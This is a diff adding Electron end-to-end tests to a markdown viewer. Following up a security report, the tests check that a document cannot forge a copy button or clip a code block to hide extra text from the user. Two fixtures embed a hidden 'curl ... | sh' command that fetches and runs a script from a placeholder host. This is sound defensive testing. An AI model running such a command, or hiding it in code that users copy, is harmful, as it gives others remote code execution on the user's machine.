@@ -415,6 +415,116 @@ test('openFile loads markdown, updates title, and renders code highlighting', as
   }
 })
 
+// security-report.md L1 (2026-10-13): a document's raw HTML can rebuild a code block with MDV's
+// own copy-button markup and hide extra text in it (font-size:0 still lands in innerText). The
+// forged button must do nothing, and the renderer's own button beside it must still copy. With
+// copyCode's restore timer held, every copy that ran leaves one held timer and its `.copied`
+// class behind, so "the forged click did nothing" is read from state, not from a wait.
+test('a copy button forged by the document copies nothing, and the real one still copies', async () => {
+  const { electronApp, page } = await launchApp()
+
+  try {
+    await emitFileOpened(electronApp, {
+      content: [
+        '# Install',
+        '',
+        '```bash',
+        'npm install left-pad',
+        '```',
+        '',
+        '<div class="code-wrapper"><pre><code class="hljs">npm install left-pad<span style="font-size:0">; curl -s https://example.invalid/x | sh</span></code></pre><button id="forged-copy" class="copy-btn" type="button" data-command="copyCode" data-command-element="true">C</button></div>',
+        '',
+      ].join('\n'),
+      filename: 'forged-copy.md',
+      path: '/tmp/mdv-forged-copy.md',
+    })
+    const forged = page.locator('#forged-copy')
+    const genuine = page.locator('#content .copy-btn:not(#forged-copy)')
+    await forged.waitFor()
+    assert.equal(await genuine.count(), 1)
+    assert.equal(await forged.getAttribute('data-command'), 'copyCode', 'the forged button survives sanitizing')
+
+    await electronApp.evaluate(({ clipboard }) => clipboard.writeText('sentinel'))
+    await armCopyResetGate(page)
+    await forged.click()
+    await genuine.click()
+    await page.waitForFunction(() => document.querySelector('#content .copy-btn:not(#forged-copy)')?.classList.contains('copied'))
+
+    assert.equal(await heldCopyResetCount(page), 1, 'exactly one copy ran')
+    assert.equal(await forged.evaluate(el => el.classList.contains('copied')), false)
+    const copied = await electronApp.evaluate(({ clipboard }) => clipboard.readText())
+    assert.equal(copied.trim(), 'npm install left-pad')
+    await releaseCopyResetGate(page)
+  } finally {
+    await closeApp(electronApp)
+  }
+})
+
+// The residual half of L1: a document wrapping a genuine block in its own clipping box. The
+// blank lines end the HTML block, so the fence renders as a real block with a real copy button,
+// and innerText (what that button copies) keeps clipped lines. Author HTML now loses `style`, so
+// the box must not clip: it is at least as tall as the code inside it.
+test('a document cannot clip a genuine code block with its own styled wrapper', async () => {
+  const { electronApp, page } = await launchApp()
+
+  try {
+    await emitFileOpened(electronApp, {
+      content: [
+        '<div id="clip" style="max-height:1.4em;overflow:hidden">',
+        '',
+        '```bash',
+        'npm install left-pad',
+        'curl -s https://example.invalid/x | sh',
+        '```',
+        '',
+        '</div>',
+        '',
+      ].join('\n'),
+      filename: 'clipped-copy.md',
+      path: '/tmp/mdv-clipped-copy.md',
+    })
+    await page.waitForSelector('#clip .code-wrapper code.hljs')
+    const box = await page.evaluate(() => {
+      const clip = document.getElementById('clip')
+      const code = clip.querySelector('code')
+      return {
+        style: clip.getAttribute('style'),
+        maxHeight: getComputedStyle(clip).maxHeight,
+        clipHeight: clip.getBoundingClientRect().height,
+        codeHeight: code.getBoundingClientRect().height,
+      }
+    })
+    assert.equal(box.style, null)
+    assert.equal(box.maxHeight, 'none')
+    assert.ok(box.clipHeight >= box.codeHeight, `the wrapper clips the code: ${JSON.stringify(box)}`)
+  } finally {
+    await closeApp(electronApp)
+  }
+})
+
+// The empty state's open buttons sit inside #content, so they go through the same trust check
+// as a document's. They come from two places, index.html's static markup at boot and
+// showEmptyState after the last tab closes, and each must be marked as the app's own.
+test('the empty state open button works at boot and again after the last tab closes', async () => {
+  const { electronApp, page } = await launchApp()
+  const tabCount = () => page.evaluate(() => document.querySelectorAll('#tab-list .file-tab').length)
+
+  try {
+    await page.waitForSelector('#empty')
+    await stubOpenDialog(electronApp, [BASIC_MD])
+    await page.locator('#empty .empty-cta[data-command="openFile"]').click()
+    await page.waitForFunction(() => document.querySelectorAll('#tab-list .file-tab').length === 1)
+
+    await emitRendererCommand(electronApp, 'closeCurrentTab')
+    await page.waitForSelector('#empty .empty-cta[data-command="openFile"]')
+    assert.equal(await tabCount(), 0)
+    await page.locator('#empty .empty-cta[data-command="openFile"]').click()
+    await page.waitForFunction(() => document.querySelectorAll('#tab-list .file-tab').length === 1)
+  } finally {
+    await closeApp(electronApp)
+  }
+})
+
 test('mermaid fence renders an actual diagram, redraws on a theme toggle, and reuses its snapshot on tab switch', async () => {
   const { electronApp, page } = await launchApp()
   const consoleErrors = []
